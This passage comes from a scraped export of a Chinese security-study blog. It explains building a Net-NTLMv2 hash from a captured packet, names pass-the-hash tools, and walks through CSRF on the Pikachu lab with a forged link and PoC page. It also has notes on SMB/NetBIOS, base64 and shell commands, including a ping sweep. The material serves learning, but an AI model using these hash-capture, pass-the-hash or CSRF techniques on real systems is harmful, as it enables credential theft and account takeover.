51 49 f6 4e 00 00 00 00 02 00 1e 00&gt; 57 00 49 00 4e 00 2d 00 55 00 52 00 41 00 55 00&gt; 30 00 4c 00 4a 00 42 00 37 00 52 00 31 00 01 00&gt; 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00 41 00&gt; 55 00 30 00 4c 00 4a 00 42 00 37 00 52 00 31 00&gt; 04 00 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00&gt; 41 00 55 00 30 00 4c 00 4a 00 42 00 37 00 52 00&gt; 31 00 03 00 1e 00 57 00 49 00 4e 00 2d 00 55 00&gt; 52 00 41 00 55 00 30 00 4c 00 4a 00 42 00 37 00&gt; 52 00 31 00 07 00 08 00 32 3b 26 fa 22 ec d4 01&gt; 06 00 04 00 02 00 00 00 08 00 30 00 30 00 00 00&gt; 00 00 00 00 01 00 00 00 00 20 00 00 83 61 12 00&gt; 1b 95 5a d5 09 15 f1 c9 06 70 51 a1 67 f3 56 d3&gt; 3e 2b ab 5f b2 63 49 b2 ca 9f 05 49 0a 00 10 00&gt; 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&gt; 09 00 24 00 63 00 69 00 66 00 73 00 2f 00 31 00&gt; 39 00 32 00 2e 00 31 00 36 00 38 00 2e 00 31 00&gt; 2e 00 31 00 30 00 32 00 00 00 00 00 00 00 00 00&gt; 00 00 00 00&gt; &gt; NTLMv2 Client Challenge值为：aed4bf395149f64e 我们可以从数据包中提取并构建出Net-NTLM Hash： username即administrator。 hostname即192.168.1.102。 challenge即79f3c64adead4f15。（这里要注意的是是Server Challenge，而不是Client Challenge） HMAC-MD5即09684aaf9d328a4cc23c301d7061232d。 blob即： 123456789101112131415161718192001 01 00 00 00 00 00 00 32 3b 26 fa 22 ec d4 01ae d4 bf 39 51 49 f6 4e 00 00 00 00 02 00 1e 0057 00 49 00 4e 00 2d 00 55 00 52 00 41 00 55 0030 00 4c 00 4a 00 42 00 37 00 52 00 31 00 01 001e 00 57 00 49 00 4e 00 2d 00 55 00 52 00 41 0055 00 30 00 4c 00 4a 00 42 00 37 00 52 00 31 0004 00 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 0041 00 55 00 30 00 4c 00 4a 00 42 00 37 00 52 0031 00 03 00 1e 00 57 00 49 00 4e 00 2d 00 55 0052 00 41 00 55 00 30 00 4c 00 4a 00 42 00 37 0052 00 31 00 07 00 08 00 32 3b 26 fa 22 ec d4 0106 00 04 00 02 00 00 00 08 00 30 00 30 00 00 0000 00 00 00 01 00 00 00 00 20 00 00 83 61 12 001b 95 5a d5 09 15 f1 c9 06 70 51 a1 67 f3 56 d33e 2b ab 5f b2 63 49 b2 ca 9f 05 49 0a 00 10 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0009 00 24 00 63 00 69 00 66 00 73 00 2f 00 31 0039 00 32 00 2e 00 31 00 36 00 38 00 2e 00 31 002e 00 31 00 30 00 32 00 00 00 00 00 00 00 00 0000 00 00 00 最终结果为： 1administrator::192.168.1.102:79f3c64adead4f15:09684aaf9d328a4cc23c301d7061232d:0101000000000000323b26fa22ecd401aed4bf395149f64e0000000002001e00570049004e002d00550052004100550030004c004a00420037005200310001001e00570049004e002d00550052004100550030004c004a00420037005200310004001e00570049004e002d00550052004100550030004c004a00420037005200310003001e00570049004e002d00550052004100550030004c004a00420037005200310007000800323b26fa22ecd40106000400020000000800300030000000000000000100000000200000836112001b955ad50915f1c9067051a167f356d33e2bab5fb26349b2ca9f05490a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003200000000000000000000000000 使用中间人攻击的方式可以获取Net-NTLM hash，常用工具为Responder和Inveigh。 NTLM v1/v2区别： 认证的流程是一样的，不同的地方在于： Challage长度：NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。 加密Challenge的算法：NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。 使用NTLM协议进行认证的协议： SMB HTTP LDAP MSSQL …. 0x05 Pass The Hash观察NTLM认证的过程可以发现，整个过程中实际上并没有进行明文密码的传递，也没有使用明文密码来加密Challenge，而是用明文密码对应NT Hash来加密Challenge，那么就意味着： 只要我们知道相应用户密码的NT Hash，我们就可以自己构造出Response发送给服务器，从而通过验证。我们并不需要知道用户的明文密码。这种攻击方式就称之为哈希传递（Pass The Hash）。 常用哈希传递攻击的工具： Smbmap Smbexec Metasploit psexec CrackMapExec 参考资料 https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4 https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html http://www.adshotgyan.com/2012/02/lm-hash-and-nt-hash.html https://payloads.online/archivers/2018-11-30/1?tdsourcetag=s_pcqq_aiomsg#0x00-%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81 https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/ https://xz.aliyun.com/t/2205 https://github.com/crazywa1ker/DarthSidious-Chinese/blob/master/getting-started/intro-to-windows-hashes.md","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://sakuxa.com/categories/内网渗透/"}],"tags":[{"name":"NTLM","slug":"NTLM","permalink":"https://sakuxa.com/tags/NTLM/"}]},{"title":"Python模块 Chapter 1：Base64","slug":"01python模块之Base64","date":"2019-03-29T08:22:48.000Z","updated":"2019-05-21T02:44:02.638Z","comments":true,"path":"2019/03/29/01python模块之Base64/","link":"","permalink":"https://sakuxa.com/2019/03/29/01python模块之Base64/","excerpt":"0x00 Base64编码概述 Base64字符集共64个ASCII字符，Base64编码即用这64个ASCII字符来表示任意二进制数据的方法。 Base64主要是为了解决有些非打印字符二进制无法正常显示。比如我们使用notepad打开图片，会有乱码。通过对任何二进制数据进行Base64编码后，该数据都可以以字符的形式表现。","text":"0x00 Base64编码概述 Base64字符集共64个ASCII字符，Base64编码即用这64个ASCII字符来表示任意二进制数据的方法。 Base64主要是为了解决有些非打印字符二进制无法正常显示。比如我们使用notepad打开图片，会有乱码。通过对任何二进制数据进行Base64编码后，该数据都可以以字符的形式表现。 0x01 编码原理 将内存中每3个字节的二进制数据分为一组，一组3*8=24个字节。 再将每组分为4个小组，每个小组24/4=6bit。 计算每个小组的数字索引（0——63）。 将计算得到的数字索引查找Base字符集表得到对应ASCII字符，该字符就是该小组编码后得到的结果。 以此类推，依次进行分组编码。 Misc 所以，Base64编码会把3字节的二进制数据编码为4字节的文本数据。 如果要编码的二进制数据不是3的倍数，Base64用\\x00字节在末尾补足后，再在编码的得到的字符串末尾加上1个或2个=号，表示补了多少字节，解码的时候，会自动去掉。 可以自己定义64个字符的排列顺序，这样就可以自定义Base64编码，不过，通常情况下完全没有必要。 Base64是一种编码方法，不能用于加密，不存在安全性，即使使用自定义的编码表也不行。 Base64适用于小段内容的编码，比如数字证书签名、Cookie的内容等。 由于‘=’字符也可能出现在Base64编码中，但‘=’用在URL、Cookie里面会造成歧义，所以，很多Base64编码后会把=去掉。去掉=后怎么解码呢？ 因为Base64是把3个字节变为4个字节，所以，Base64编码的长度永远是4的倍数，因此，需要加上=把Base64字符串的长度变为4的倍数，就可以正常解码了。 0x02 Python Base64123456789101112131.标准Base64: import base64 base64.b64encode(b'superwu') #base64编码 base64.b64decode(b'c3VwZXJ3dQ==') #base64解码2.由于标准的Base64编码后可能出现字符+和/，在URL中就不能直接作为参数,会产生歧义，所以又有一种\"url safe\"的base64编码，其实就是把字符+和/分别变成-和_： &gt;&gt;&gt; base64.b64encode(b'i\\xb7\\x1d\\xfb\\xef\\xff') #标准base64编码 b'abcd++//' &gt;&gt;&gt; base64.urlsafe_b64encode(b'i\\xb7\\x1d\\xfb\\xef\\xff') # b'abcd--__' &gt;&gt;&gt; base64.urlsafe_b64decode('abcd--__') b'i\\xb7\\x1d\\xfb\\xef\\xff'","categories":[{"name":"Python","slug":"Python","permalink":"https://sakuxa.com/categories/Python/"}],"tags":[{"name":"Python模块","slug":"Python模块","permalink":"https://sakuxa.com/tags/Python模块/"},{"name":"base64","slug":"base64","permalink":"https://sakuxa.com/tags/base64/"}]},{"title":"文件描述符、重定向、管道浅析","slug":"文件描述符、重定向、管道浅析","date":"2019-03-29T06:56:20.000Z","updated":"2019-05-21T03:13:20.526Z","comments":true,"path":"2019/03/29/文件描述符、重定向、管道浅析/","link":"","permalink":"https://sakuxa.com/2019/03/29/文件描述符、重定向、管道浅析/","excerpt":"结合自己的理解以及为了让自己容易去理解，并不保证完全正确性。","text":"结合自己的理解以及为了让自己容易去理解，并不保证完全正确性。 0x01 重定向、文件描述符、管道文件描述符 首先，Linux的哲学之一即一切皆文件。 其次，系统若要操作一个文件，就必须明确的指定这个文件，这就涉及到如何标识文件。我们标识文件使用的是文件名，但文件名只是为了用户可读性，但是计算机不同，计算机考虑的是性能而不是可读性。 Linux使用文件描述符来标识一个文件，文件描述符实际是一个数字，不同的文件使用不同的数字来标识，Windows类似的是文件句柄。 在使用文件描述符时，直接使用会与真正的数字产生歧义，因此通过在数字之前使用&amp;来标识该数字是文件描述符。 每个程序在运行前都会打开三个文件，分别是标准输入、标准输出、标准错误输出，文件描述符分别为0，1，2。 我们把这三个文件当作三块内存空间，系统用0，1，2来标识这三块内存空间，程序从文件描述符为0的内存空间读取数据作为程序的输入，把程序输出的数据输出到文件描述符为1的内存空间中，把错误信息输出到文件描述符为2的内存空间中。 简单说就是，程序在运行前会分配三块内存空间，然后分别标识为0，1，2，然后程序在运行时只管从标识符为0的内存读取数据，向标识符为0的内存输出数据，向标识符为2的内存输出错误信息。 两个问题： 不同的程序使用一样的0，1，2文件描述符来标识会导致混乱吗？ 不用担心一样的标识会导致混乱，因为我们知道进程之间的内存空间是隔离独立的。 为什么要用三块内存作为中间区域，以及为什么都规定它们的文件描述符为0，1，2？ 首先，采用中间区域的区域我想作用就是作为缓冲区。 其次，之所以都要使用0，1，2来标识，我觉得可以从用户的角度出发，用户只需要操作0，1，2这三个文件操作符接口就可以了，至于这三个内存区域绑定了哪个文件就交给操作系统了。假设，如果这个过程交给用户，那么用户想要把数据输出打印到屏幕上，那么首先得获取显示器对应的文件描述符，而把这个过程交给操作系统，然后操作系统提供一个接口（即0，1，2文件描述符）给用户使用，大大减小了用户的工作。 重定向 根据上面我们的理解可知，程序只管对标识符为0,1,2的内存空间进行操作。那么有几个问题，程序从标识符为0的内存空间中读取数据，那么谁又向该内存空间写入数据呢？总不可能凭空产生吧。程序向标识符为1的内存空间输出数据，那么谁又会从该内存空间读取并使用里面的数据呢？标准错误输出同理。 为了解决上面的问题，这三块内存区域还应该与其他东西绑定，它们用于向这三块内存区域写入或读取数据。默认情况下，与标识符为0的内存空间绑定的标准输入设备就是键盘，与标识符为1的内存空间绑定的标准输出设备就是显示器，与标识符为2的内存空间绑定的标准错误输出设备也是显示器。 接下来我们回到这节的重点：重定向。 重定向可以理解为更改这三块内存空间绑定的对象。 输入重定向：&lt; 输出重定向：&gt;、&gt;&gt; 错误重定向：2&gt;、2&gt;&gt; 例如cat test1.txt &gt; test2.txt，就是把标识符为1的内存空间绑定的对象从显示器更改为了文件。其他同理。 对于0&gt;&amp;1这种操作的理解： 意思是将标识符为0的内存空间要绑定的对象改为标识符为1的内存空间当前绑定的对象。 注意，是当前的，意味是如果之后标识符为1的内存空间改变了绑定对象，并不会导致标识符为0的内存空间改变绑定对象。 管道 管道也可以理解为一块内存空间，这块内存空间绑定着前一个进程的标识符为1的内存空间以及后一个进程标识符为0的内存空间。即前一个进程输出的数据作为后一个进程的输入数据。 参考资料： https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/","categories":[{"name":"Misc","slug":"Misc","permalink":"https://sakuxa.com/categories/Misc/"}],"tags":[{"name":"文件描述符","slug":"文件描述符","permalink":"https://sakuxa.com/tags/文件描述符/"},{"name":"重定向","slug":"重定向","permalink":"https://sakuxa.com/tags/重定向/"},{"name":"管道","slug":"管道","permalink":"https://sakuxa.com/tags/管道/"}]},{"title":"WEB漏洞靶场Pikachu Writeup Chapter 3：CSRF","slug":"WEB漏洞靶场pikachu-CSRF","date":"2019-03-25T05:09:32.000Z","updated":"2019-05-21T03:26:31.388Z","comments":true,"path":"2019/03/25/WEB漏洞靶场pikachu-CSRF/","link":"","permalink":"https://sakuxa.com/2019/03/25/WEB漏洞靶场pikachu-CSRF/","excerpt":"跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。","text":"跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。 CSRF之GET提交数据打开页面，是一个登录页面，我们使用lucy/123456进入用户后台。 进入用户后台后，点击修改个人信息，修改信息后点击提交并使用Burp进行抓包。 观察Burp抓到的数据包可以发现，数据包是以GET方式提交的，参数与表单的输入框也是一一对应的，没有任何CSRF防御。 那么我们只需要修改 http://192.168.100.111/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=female&amp;phonenum=12345678922&amp;add=US&amp;email=lucy%40pikachu.com&amp;submit=submit这个链接的参数值部分，然后发给想要攻击的用户，若用户本地存在身份认证信息（Cookie），那么他的个人信息就会被修改为我们链接里面的信息。 漏洞分析 通过源码可以得知，服务器接收到用户提交的修改个人信息的请求时，只判断是否登录以及是否有信息为空，若不为空就直接更新个人信息数据表，没有进行任何CSRF验证。 CSRF之POST提交数据同上一节一样，登录然后修改信息抓包，不同的是这次我们抓包发现数据是以POST方式提交的。 然后右键数据包，按下图方式选择生成CSRF PoC。 根据下图修改信息生成PoC： 将拷贝的PoC存储为evil.html，并且放于我们的服务器上。然后将该PoC文件的URL地址发给想要攻击的用户，用户点击访问该PoC文件，PoC文件的表单数据就会被提交到服务器，导致用户信息被修改。 漏洞分析 与上一节基本没什么区别，区别只是提交数据的方式不同。 Token防止CSRF接下来看Token是如何防止CSRF的。 点击修改个人信息按钮后，服务器会返回一个个人信息的表单页面。表单会嵌入一个隐藏的&lt;input /&gt;标签，标签的value属性值为服务器端生成并存储在Session中的token，表单数据被提交时，token也会被提交到服务器。 当填好个人信息的表单，点击提交后，服务器不仅检查信息是否有空值，还会将表单提交过来的token值也Session中的token值作对比，对比不通过不会执行个人信息修改操作。 Token防止CSRF的本质是让攻击者无法完整预测数据包的参数部分。","categories":[{"name":"Pikachu","slug":"Pikachu","permalink":"https://sakuxa.com/categories/Pikachu/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://sakuxa.com/tags/XSS/"},{"name":"靶场","slug":"靶场","permalink":"https://sakuxa.com/tags/靶场/"},{"name":"WEB安全","slug":"WEB安全","permalink":"https://sakuxa.com/tags/WEB安全/"}]},{"title":"CSRF （Cross Site Request Forgery）","slug":"CSRF","date":"2019-03-25T02:11:08.000Z","updated":"2019-05-21T03:30:11.215Z","comments":true,"path":"2019/03/25/CSRF/","link":"","permalink":"https://sakuxa.com/2019/03/25/CSRF/","excerpt":"CSRF主要利用受害者尚未失效的身份认证信息（Cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。","text":"CSRF主要利用受害者尚未失效的身份认证信息（Cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。 0x00 漏洞本质其一、CSRF可以攻击成功的本质原因是因为请求的所有重要参数都可以被攻击者预测。 其二、被攻击者在不知情的情况下身份认证信息（Cookie）被使用了。 由上面两点我们可知，如果我们能够知道一个请求消息的所有参数，参数的值可以进行伪造，且被害者本地有认证信息（本地Cookie或临时Cookie），那么我们把该请求消息诱骗被害者来点击/提交，就能完成攻击。 0x01 CookieCookie通常用来进行用户身份认证及状态记录。 Cookie可以分为两种： Session Cookie：又叫临时cookie。 Third-party Cookie：又叫本地Cookie。 当Set-Cookie时，若指定了expire时间，在expire时间超时之前，都将被存储在本地，就叫本地Cookie。 当Set-Cookie时，若没有指定expire时间，仅存在于浏览器的程序的生命周期内，保存在浏览器进程的内存中，关闭浏览器后失效（新建tab页不会失效）。此时就是临时Cookie。 0x02 浏览器Cookie策略Cookie是在发起请求时浏览器自动携带在请求消息中的。 对于一些跨域请求操作，一些浏览器处于安全考虑，默认会禁止在跨域请求时携带本地Cookie（临时Cookie不限制）。 默认会禁止的浏览器：IE6/7/8、Safari等。 默认不会禁止的浏览器：Firefox、Chrome、Android等。 对于&lt;a&gt;、&lt;script&gt;、&lt;link&gt;、&lt;img&gt;、&lt;iframe&gt;等标签都可以进行跨域请求资源。 因此，对于禁止在跨域请求时携带本地Cookie的情况下，攻击更复杂，比如需要让受害者先访问目标站点并进行了身份认证，让浏览器中先存在临时Cookie。对于没有禁止的环境下，只要受害者本地存储有Cookie，就能完成攻击。 0X03 GET与POST提交数据若存在CSRF漏洞的功能点是以GET方式提交数据，只需要修改GET请求链接内容然后让用户点击即可完成攻击。 若存在CSRF漏洞的功能点是以POST方式提交数据，我们需要在我们的服务器上创建一个提交数据的表单页面，然后让用户访问该页面。 0x04 CSRF防御 防御的思路围绕CSRF的本质考虑。 1. 验证码 对某些重要的操作，使用验证码验证，验证码一方面避免了身份认证信息在不知情的情况下被使用（因为与服务器有交互），另一方面攻击者在不知道验证码参数的值也无法完成攻击。 缺点就是用户体验会很差，因为每次操作都需要输入验证码。因此作为辅助的防御手段。 2. Referer Check 在HTTP请求消息头中有一个Referer头部，该头部的值记录着是从哪个页面（URL）跳转过来的。 通过对消息Referer头部进行检查，也可以对CSRF防御起到一定的作用。 缺点是服务器不是任何时候都能获取的Referer的值，有时候出于安全考虑，限制了Referer的发送。 3. Token Token是一串足够长且复杂的随机数，Token防御CSRF的本质就是让请求参数不可被预测，不能被预测也就意味着攻击者不能构造出恶意数据包请求。 逻辑： 当客户端访问页面时，服务器会生成Token，然后把Token值存储在Session中，并且在返回的表单页面中也会嵌入一个隐藏的&lt;input /&gt;标签，标签的value属性值即为Token值。当用户填写表单提交数据时，Token也会自动被作为参数提交，服务器会先将提交过来的Token与Session中存储的Token做对比验证。 针对CSRF的防御，如今一致的选择都是Token，但是使用Token也要注意一些安全准则： Token在使用后要及时销毁，避免被重复使用。 Token参数尽可能采用POST方式提交，因为GET方式会将其放到URL中，可能会被Referer头部泄露。 若页面同时还存在XSS漏洞，那么Token防御将变得没有作用，因为XSS可以先读取到页面的Token再构造请求，即XSRF。","categories":[{"name":"WEB漏洞学习","slug":"WEB漏洞学习","permalink":"https://sakuxa.com/categories/WEB漏洞学习/"}],"tags":[{"name":"CSRF","slug":"CSRF","permalink":"https://sakuxa.com/tags/CSRF/"},{"name":"跨站请求伪造","slug":"跨站请求伪造","permalink":"https://sakuxa.com/tags/跨站请求伪造/"}]},{"title":"NetBIOS、SMB浅析","slug":"NetBIOS、SMB浅析","date":"2019-03-23T03:54:48.000Z","updated":"2019-05-21T03:34:37.430Z","comments":true,"path":"2019/03/23/NetBIOS、SMB浅析/","link":"","permalink":"https://sakuxa.com/2019/03/23/NetBIOS、SMB浅析/","excerpt":"一直以来对NetBIOS和SMB很模糊，也分不清137、138、139、445端口的作用。借此有时间想进行梳理并记录以便自己理解。","text":"一直以来对NetBIOS和SMB很模糊，也分不清137、138、139、445端口的作用。借此有时间想进行梳理并记录以便自己理解。 NetBIOS NetBIOS，为网络基本输入输出系统（英语：Network Basic Input/Output System）的缩写，它提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。严格来说，NetBIOS不是一种网络协议，而是应用程序接口（API）。 ——摘自Wikipedia NetBIOS提供了三种软件服务： 名称解析服务（NetBIOS Name Service）：UDP 137 数据报服务（NetBIOS Datagram Service）：UDP 138 会话服务（NetBIOS Session Service）：TCP 139 0x00 名称解析服务（NBNS） 运行在137（UDP）端口，提供计算机的名字到IP地址的查询服务，类似于TCP/IP协议中的DNS。 计算机名称到IP地址的管理方式： 第一种：位于同一工作组中的电脑之间利用广播功能进行计算机名管理。 ​ 电脑在启动或者连接网络时，会向同一工作组中的所有计算机质询有没有和自己相同的NetBIOS名称。 另一种：利用WINS（Windows因特网名称服务）管理NetBIOS名称。 WINS服务器用于记录计算机NetBIOS名称和IP地址的对应关系，供局域网计算机查询。WINS客户端在系统起动时或连接网络时会将自己的NetBIOS名称与IP地址发送给WINS服务器。 向目标主机的137端口发送一个连接请求，就能获得目标主机的名称、MAC地址。 NBTSTATnbtstat是Windows下与NetBIOS相关的DOS命令。 12345678910111213141516NBTSTAT [ [-a RemoteName] [-A IP address] [-c] [-n] [-r] [-R] [-RR] [-s] [-S] [interval] ] -a (适配器状态) 列出指定名称的远程机器的名称表（可跟名称和IP） -A (适配器状态) 列出指定 IP 地址的远程机器的名称表。（只能IP） -c (缓存) 列出远程[计算机]名称及其 IP 地址的 NBT 缓存 -n (名称) 列出本地 NetBIOS 名称。 -r (已解析) 列出通过广播和经由 WINS 解析的名称 -R (重新加载) 清除和重新加载远程缓存名称表 -S (会话) 列出具有目标 IP 地址的会话表 -s (会话) 列出将目标 IP 地址转换成计算机 NETBIOS 名称的会话表。 -RR (释放刷新) 将名称释放包发送到 WINS，然后启动刷新 RemoteName 远程主机计算机名。 IP address 用点分隔的十进制表示的 IP 地址。 interval 重新显示选定的统计、每次显示之间暂停的间隔秒数。 按 Ctrl+C 停止重新显示统计。 环境介绍： 我们的局域网中存在两台主机，分别是： 主机名（NetBIOS名称） &lt;=========&gt; IP地址 ​ SAKURA_II &lt;=========&gt; 192.168.1.105 ​ XESTATION &lt;=========&gt; 192.168.1.101 以下演示的操作均在IP为192.168.1.105的主机上进行，并使用Wireshark抓包分析。 nbtstat -A 192.168.1.101 ：查询IP为192.168.1.101主机的计算机的名称列表。 实质是向192.168.1.101主机的NetBIOS的名称解析服务（NBNS)监听的UDP 137端口发送查询。 Wireshark抓取请求包： 命令执行的结果： nbtstat -c：查询NetBIOS缓存。 nbtstat -n：查询本地NetBIOS名称。 0x01 数据报服务（NBDS） 运行在138（UDP）端口，提供NetBIOS浏览功能，即显示连接到网络的计算机设备列表。 每台电脑在启动时或连接网络时通过138端口广播自己的NetBIOS名称，收到NetBIOS广播的计算机会将该计算机追加到浏览列表中； 关闭电脑时，计算机会通过138端口广播，收到NetBIOS广播的计算机会将该计算机从浏览列表中删除； 当计算机需要连接加入到网络的计算机设备列表，会广播一个请求，收到请求的主机会给其发送计算机列表。 向目标主机的138端口发送请求，就能获得目标主机所处的局域网的网络名称以及目标主机的计算机名称，以及是否安装主控控制器，IIS是否正在运行等。 周期性在UDP 138端口广播NetBIOS信息： 0x02 会话服务（NBSS） 运行在139（TCP）端口，提供“NetBIOS Session Service”服务，使用SMB协议对外提供共享服务，包括Windows文件和打印机共享以及Unix中的Samba服务。 SMB协议SMB（Server Message Block）是由微软开发的应用层网络传输协议，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。 经过Unix服务器厂商重新开发后，它可以用于连接Unix服务器和Windows客户机，执行打印和文件共享等任务。 SMB一开始的设计是在NetBIOS协议上运行的（而NetBIOS本身则运行在NetBEUI、IPX/SPX或TCP/IP协议上），从Windows 2000开始，微软引入SMB Direct Over TCP，重新命名为 CIFS（Common Internet File System），并打算将它与NetBIOS相脱离。 CIFSCIFS是由微软在SMB的基础上，扩展到Internet上的协议。若SMB直接运行在TCP上（而不是NetBIOS上），即CIFS协议，使用TCP端口号445。提供的功能与139端口完全相同。 为保证向后兼容性，Windows 2000以后版本中基于NBT的SMB和CIFS同时并存。 当Windows系统（允许NBT）来连接SMB服务器时，同时尝试连接139和445端口： 如果445端口有响应，那么发送RST包给139端口断开连接，使用455端口提供SMB服务。 当445端口无响应时，使用139端口提供SMB服务。 Wireshark抓包在主机192.168.1.105上开启文件共享，不需要密码。 在主机192.168.1.101上访问192.168.1.105主机上的共享：\\192.168.1.105 参考资料 https://www.cnblogs.com/bigrabbit/p/3910094.html","categories":[{"name":"Misc","slug":"Misc","permalink":"https://sakuxa.com/categories/Misc/"}],"tags":[{"name":"SMB","slug":"SMB","permalink":"https://sakuxa.com/tags/SMB/"},{"name":"NetBIOS","slug":"NetBIOS","permalink":"https://sakuxa.com/tags/NetBIOS/"}]},{"title":"Amazing Command -Linux篇","slug":"Amazing-Command-Linux","date":"2019-03-22T06:24:08.000Z","updated":"2019-05-21T03:38:19.359Z","comments":true,"path":"2019/03/22/Amazing-Command-Linux/","link":"","permalink":"https://sakuxa.com/2019/03/22/Amazing-Command-Linux/","excerpt":"记录一些自己觉得有用或有趣的Linux命令的用法，持续更新……","text":"记录一些自己觉得有用或有趣的Linux命令的用法，持续更新…… 0x00 awk awk默认的行为是从标准输入中逐行（即每次读取直到遇到换行符\\n停止）读入数据，并以空格为默认分隔符将读取的每行数据切片，$0指代整行数据，$1指代切片得到的第一部分，$2指代切片得到的第二部分，以此类推,$n指代切片得到的第n部分。 awk + action：对awk的默认行为得到的数据直接进行action。 格式：awk &#39;{action}&#39; last -n 2 | awk ‘{print $0}’ 12nick :0 :0 Fri Mar 29 10:08 still logged inreboot system boot 4.18.0-16-generi Fri Mar 29 10:07 still running last -n 2 | awk ‘{print $1}’ 12nick reboot awk + pattern + action：对读取的每行先使用pattern正则去匹配，满足正则的才进行awk的默认行为，然后进行action。 格式：awk &#39;/pattern/{action}&#39; last -n 4 | awk ‘/nick/{print $0}’ 12nick :0 :0 Fri Mar 29 10:08 still logged innick :0 :0 Thu Mar 28 10:48 - 17:16 (06:27) last -n 4 | awk ‘/^nick/‘ 12reboot system boot 4.18.0-16-generi Fri Mar 29 10:07 still runningreboot system boot 4.18.0-16-generi Thu Mar 28 10:47 - 17:16 (06:28) -F 用于指定分割符，默认是空格。printf()用来格式化输出。 cat /etc/passwd | awk -F ‘:’ ‘/root/{printf(“%s,%s”,$1,$7)}’ 1root,/bin/zsh% 0x01 screenfetch 用于显示系统基本信息及其banner。 直接screenfetch会显示系统基本信息及其对应的ASCII字符banner。 screenfetch -A &#39;OS_name&#39;：显示系统基本信息及指定系统的ASCII字符banner。 123#用于你可能是ubuntu，但是却希望打印的图标是Mac或其他screenfetch -A &apos;Mac OS X&apos;screenfetch -A &apos;Kali Linux&apos; screenfetch -s：屏幕快照，即截屏。","categories":[{"name":"Misc","slug":"Misc","permalink":"https://sakuxa.com/categories/Misc/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sakuxa.com/tags/Linux/"}]},{"title":"Amazing Command -Windows篇","slug":"Amazing-Command-Windows","date":"2019-03-22T06:23:54.000Z","updated":"2019-05-21T03:39:09.510Z","comments":true,"path":"2019/03/22/Amazing-Command-Windows/","link":"","permalink":"https://sakuxa.com/2019/03/22/Amazing-Command-Windows/","excerpt":"记录一些自己觉得有用或有趣的DOS命令的用法，持续更新…… 直接记录命令的某种用法，具体用法使用命令的/?的选项查看。（Window命令的/？选项就类似于Linux命令的-h）","text":"记录一些自己觉得有用或有趣的DOS命令的用法，持续更新…… 直接记录命令的某种用法，具体用法使用命令的/?的选项查看。（Window命令的/？选项就类似于Linux命令的-h） 0x01 DOS命令FOR 格式：FOR %variable IN (set) DO command [command-parameters] %variable：指定一个单一字母可替换的参数。 (set)：指定一个或一组文件。可以使用通配符。 command：指定对每个文件执行的命令。 command-parameters：为特定命令指定参数或命令行开关。 用法一：从/R指定的路径中找到符合set内特征的文件，并打印文件名。 格式：FOR /R [[drive:]path] %variable IN (set) DO command [command-parameters] 12345FOR /R T:\\PythonCode %i IN (*.py) DO @echo %i //打印出T:\\PythonCode下的所有后缀为.py的文件名。FOR /R T:\\PythonCode %i IN (.) DO @echo %i //遍历T:\\PythonCode下的所有目录，并打印目录路径。FOR /R T:\\PythonCode %i IN (*) DO @echo %i //遍历T:\\PythonCode下的所有目录文件，并打印文件名。FOR /R %i IN (.) DO @echo %i //遍历当前目录下的目录树。FOR /R %i IN (*) DO @echo %i //遍历当前目录下的文件名。 用法二：使用/L参数是，后面的set将变为一个产生数字迭代器。 格式：FOR /L %variable IN (start,step,end) DO command [command-parameters] 12345FOR /L %i IN (1,1,254) DO @ping 192.168.100.%i -n 1 -w 1 | findstr /i ttl //ping 192.168.100.0这个网段，并筛选出ping通的主机// -n 1表示只发一个echo-request。// -w 1表示只等待echo-reply的时间，超时则认为目标不存活。 findstr 将其作为Window下的Grep使用。 常用参数： /I：大小写不敏感，默认敏感。 /M：如果文件含有匹配项，只打印其文件名，而不是匹配字符所在的行。 /N：打印匹配字符所在的行号。 /S：在当前目录和所有子目录中搜索匹配文件。 /F:filename：从指定的文件中读取文件名列表作为要查找的对象。 /G:file：从指定的文件获得搜索字符串。 找到并打印出文件中的字符串行、筛选出字符串行。 123findstr \"echo header\" fish.php //找到并打印fish.php文件中，包含'echo'或'header'字符串的行。findstr /C:\"echo header\" fish.php //找到并打印fish.php文件中，包含'echo header'这个字符串的行。findstr /IMS \"echo header\" *.php 